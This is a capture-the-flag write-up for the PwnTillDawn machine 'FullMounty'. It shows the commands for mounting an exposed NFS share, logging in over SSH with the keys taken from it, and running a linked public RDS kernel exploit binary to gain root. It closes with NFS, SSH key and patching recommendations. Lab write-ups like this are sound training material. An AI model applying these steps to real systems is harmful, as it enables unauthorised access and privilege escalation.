[FullMounty](https://online.pwntilldawn.com/Target/Show/64) from [PwnTillDawn](https://online.pwntilldawn.com/) starts with an NFS share containing ssh keys, we use the private key to gain initial foothold. The kernel used by the system is outdated with a vulnerability in RDS that leads to privilege escalation giving us a root shell.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal

```

We found 4 open ports, 22 running OpenSSH, 111 running rcp, 2049 is an NFS server and 8089 is running splunk on HTTPS.

### NFS

Let's start with NFS and list any available shares.

```terminal
sudo showmount -e 10.150.150.134
Export list for 10.150.150.134:
/srv/exportnfs 10.0.0.0/8
```

We found a `/srv/exportnfs` share, let's mount it.

```terminal
[â˜…]$ sudo mount -t nfs 10.150.150.134:/srv/exportnfs /mnt/ctf -o nolock       
mount.nfs: mount system call failed
```

I got an error when mounting the share. With the help of chatGPT I added the vesion to be used in the command and it worked!

```bash
sudo mount -t nfs 10.150.150.134:/srv/exportnfs /mnt/ctf -o nolock,vers=3
```

Let's list the content of the share.

```terminal
â”Œâ”€â”€[10.66.66.230]â”€[siriusðŸ’€parrot]-[~/ctf/ptd/full]
â””â”€â”€â•¼[â˜…]$ ls -la /mnt/ctf

drwxr-xr-x 3 nobody nogroup 4096 Oct 29  2019 .local
drwxr-xr-x 3 nobody nogroup 4096 Oct 29  2019 .mozilla
```

We found an SSH key pair.

I'll copy both to my working directory, give the write permissions to the private key and connect with it.

```terminal
â”Œâ”€â”€[10.66.66.230]â”€[siriusðŸ’€parrot]-[~/ctf/ptd/full]
â””â”€â”€â•¼[â˜…]$ cp /mnt/ctf/id_rsa* .
```

Wait, we need a username to connect as? We can simply grab that from the public key.

```terminal
[â˜…]$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAucbPtwj/Ot2rkrMxBSo63gnu8cUE2NboLy226zUjXwdeSLsh9WPfON/atMJCg/uMcvlpo598E/qUsAJq3TTJTYbdMkVSH3ArxUI0gN9rNVeOOs+MBFqfXYhfyLCFv+wtKyYDMeOxTE63hhEdbKVcGLCW8qhp6yORE7CcDnXqcCP5mJHlKdUqC9VBiYzcOzcKqSh6eCpfraKGsXqOcVvHVMgK8TB/JEHxkIZY2nxEl1WC62LKctEx0ZV7KTgJHhpWy1wyiPir4FOSPWUvUZDGv15B3D/M6UCRIguFllFerAacFVPW7SmKdtV3p4+HY3H1clAsWoLJiV1DRiBxoqZgEQ== deadbeef@ubuntu
```

It's `deadbeef`, let's connect.

## **Foothold**

```terminal
[â˜…]$ ssh -i id_rsa deadbeef@10.150.150.134                                    
Unable to negotiate with 10.150.150.134 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
```

I got an error here regarding the key type, I'll add that type of key with `-oHostKeyAlgorithms=+ssh-rsa` and then reconnect.

```terminal
[â˜…]$ ssh deadbeef@10.150.150.134 -i id_rsa -oHostKeyAlgorithms=+ssh-rsa                                                                                                                   
sign_and_send_pubkey: no mutual signature supported                                                                                                                                           
deadbeef@10.150.150.134: Permission denied (publickey).
```

Got another error! We solve that with the option `-oPubkeyAcceptedAlgorithms=+ssh-rsa`.

```terminal
[â˜…]$ ssh deadbeef@10.150.150.134 -i id_rsa -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa
Linux FullMounty 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux

```

## **Privilege Escalation**

Running `uname -a` on the target we find it using a pretty old kernel.

```terminal
deadbeef@FullMounty:~$ uname -a
Linux FullMounty 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux
```

After searching on google for exploits and with some trial and error, we ended up with this [exploit](https://github.com/lucyoa/kernel-exploits/tree/master/rds) that works just fine.

Download the rds precompiled binary and upload it to the target then run it.

```terminal
deadbeef@FullMounty:~$ chmod +x rds 
deadbeef@FullMounty:~$ ./rds

We got root!

## **Prevention and Mitigation**

### NFS share

We found an NFS service running on the target, listening on port 2049. The server was exporting the share /srv/exportnfs, which was accessible to any machine within the 10.0.0.0/8 IP range.

This share appeared to contain a userâ€™s home directory, within which we discovered SSH keys. These keys were used to gain unauthorized access to the target system.

#### Recommendations for NFS Configuration

- Never expose sensitive directories such as home directories, which may contains private keys or credentials.

- Create a dedicated directory for NFS sharing, and apply strict content and permission controls

- Limit the access to only trusted hosts/subnets and avoid using broad CIDR ranges like `10.0.0.0/8`

#### Recommendations for SSH Key Handling

- SSH private keys should never be stored on shared or network-accessible locations. They should be kept in the user's local home directory with proper file permissions (chmod 600).

- Use passphrase-protected SSH keys to minimize the risk of unauthorized access if the key is ever leaked.

### Kernel

The kernel version identified on the target system is outdated and contains a known vulnerability in RDS, for which a publicly available exploit exists on the internet. This vulnerability can be leveraged to escalate privileges to root.

- Update the kernel to a newer version that fixes the vulnerability in RDS.
- Establish and maintain a regular patch management schedule to ensure critical security updates are applied in a timely manner, reducing exposure to known exploits.
